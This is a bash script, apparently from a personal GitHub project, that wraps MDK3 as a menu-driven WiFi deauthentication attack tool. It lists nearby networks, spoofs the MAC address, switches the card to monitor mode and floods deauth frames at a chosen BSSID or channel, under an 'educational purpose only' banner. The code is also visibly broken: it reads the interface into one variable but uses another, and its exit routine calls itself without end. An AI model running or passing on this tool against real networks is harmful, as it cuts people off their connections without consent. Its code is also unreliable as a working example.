#!/bin/bash

###############################################################
# A deadly WiFi deauthentication attack tool powered by MDK3. #
# [!] This tool is made for wireless deauthentication attack! #
# [!] This tool is for educational purpose only!              #
# [!] This tool is powered by MDK3.                           #
# [!] MDK3 - wireless attack tool for IEEE 802.11 networks.   #
###############################################################


# Cool banner
function banner() {
	clear
    cat << "EOF"
    ______   ______   ________   ______   __       __  __          
   /_____/\ /_____/\ /_______/\ /_____/\ /_/\     /_/\/_/\         
   \:::_ \ \\::::_\/_\::: _  \ \\:::_ \ \\:\ \    \ \ \ \ \        
    \:\ \ \ \\:\/___/\\::(_)  \ \\:\ \ \ \\:\ \    \:\_\ \ \       
     \:\ \ \ \\::___\/_\:: __  \ \\:\ \ \ \\:\ \____\::::_\/       
      \:\/.:| |\:\____/\\:.\ \  \ \\:\/.:| |\:\/___/\ \::\ \       
    ___\____/_/_\_____\/_\__\/\__\/ \____/_/_\_____\/__\__\/__     
   /_____/\ /_____/\ /_______/\ /_/\/_/\ /________/\/__/\ /__/\    
   \:::_ \ \\::::_\/_\::: _  \ \\:\ \:\ \\__.::.__\/\::\ \\  \ \   
    \:\ \ \ \\:\/___/\\::(_)  \ \\:\ \:\ \  \::\ \   \::\/_\ .\ \  
     \:\ \ \ \\::___\/_\:: __  \ \\:\ \:\ \  \::\ \   \:: ___::\ \ 
      \:\/.:| |\:\____/\\:.\ \  \ \\:\_\:\ \  \::\ \   \: \ \\::\ \
       \____/_/ \_____\/ \__\/\__\/ \_____\/   \__\/    \__\/ \::\/
                                                                
     A deadly WiFi deauthentication attack tool powered by MDK3.
EOF
echo
}

# Close program
function close()
{
	clear
	sleep 2
	ifconfig $iface down
	macchanger -p $iface
	iwconfig $iface mode managed
	ifconfig $iface up
	clear
	banner
	close
}

# Get interface
function getiface() {
        echo " [*] Wireless Interfaces: "
        ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
        echo " "
        echo  -e "   [+] Choose interface: "
        echo  -e ""
}

# Mac change
function mchange() {
        ifconfig $iface down
        iwconfig $iface mode monitor
        macchanger -r $iface
        ifconfig $iface up
}

# About
function about() {
	banner
	echo ""
	echo "  [!] This tool is made for wireless deauthentication attack!"
	echo "  [!] This tool is for educational purpose only!"
	echo "  [!] This tool is powered by MDK3."
	echo "  [!] MDK3 - wireless attack tool for IEEE 802.11 networks."
	echo ""
}

# Main function
function main() {
	banner
	echo "    --------------------------------------------------------------"
	echo "    [     CODED BY  : JAYSON CABRILLAS SAN BUENAVENTURA          ]"
	echo "    [     GITHUB    : http://github.com/mkdirlove                ]"
	echo "    [     FACEBOOK  : https://www.facebook.com/mkdirlove.git     ]"
	echo "    --------------------------------------------------------------"
	echo ""
    echo "    [01] Single BSSID Deauth                   [02] Channel Deauth"
    echo "    [03] About                                 [00] Exit "
	echo ""
    read -p "    [choose]► " opt
    clear

if [[ $opt == 01 || $opt == 1 ]]; then
	banner
	nmcli dev wifi
	echo " "
	read -p " [+] Enter target BSSID: " bssid
	clear
	banner
	echo " "
	getiface
	read interface
	echo " "
	echo " [+] Starting the attack... Press CTRL+C to stop the attack."
	mchange
	trap close EXIT
	mdk3 $iface d -t "$bssid"
elif [[ $opt == 02 || $opt == 2 ]]; then
	banner
	nmcli dev wifi
	echo ""
	read -p " [+] Enter target CHANNEL: " channel
	clear
	banner
	echo ""
	getiface
	read interface
	echo ""
	echo " Starting... Press CTRL+C to stop the attack."
	mchange
	trap close EXIT
	mdk3 $iface d -c $channel
elif [[ $opt == 03 || $opt == 3 ]]; then
    banner
	echo ""
	about
	echo ""
elif [[ $opt == 00 || $opt == 0 ]]; then
    banner
	echo ""
	sleep 2
	close
else
	echo " [!] Invalid option"
	sleep 3
	close
fi	
}

# Main argument
main